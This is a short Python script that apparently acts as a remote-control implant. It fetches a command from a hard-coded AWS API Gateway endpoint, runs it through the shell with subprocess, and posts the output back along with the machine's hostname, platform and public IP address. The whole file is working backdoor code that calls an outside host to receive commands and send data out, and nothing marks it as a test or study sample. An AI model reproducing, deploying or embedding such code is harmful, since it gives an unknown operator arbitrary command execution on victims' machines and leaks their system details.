import requests
import platform
import subprocess
import socket
api_url = "https://zkkpj4z2xc.execute-api.ca-central-1.amazonaws.com/dev"
def get_ip():
    # get ip and remove extra garb
    # use urllib3 cause its built in
    
    r = requests.get('http://ipinfo.io/ip')
    return r.text.rstrip('\n')

def get_instructions(api_url):
    r = requests.get(api_url + '/q')
    return r.json()['command']

def upload(api_url, hostname, platform, ip, command_output):
    """   hostname = request.json.get('hostname', 'n/a')
    ip_addr = request.json.get('ip', 'n/a')
    response = request.json.get('response', 'n/a')
    platform = request.json.get('platform', 'n/a')
    """
    
    new_url = api_url + '/a'
    r = requests.post(
        new_url,
        json={
            "hostname": hostname,
            "ip": ip,
            "response": command_output,
            "platform": platform
        })
    
def run_command(command_to_run):
    return subprocess.getoutput(command_to_run)


hostname = socket.gethostname()
platform = platform.platform()
command_to_run = get_instructions(api_url)
ip = get_ip()
command_output = run_command(command_to_run)
upload(api_url, hostname, platform, ip, command_output)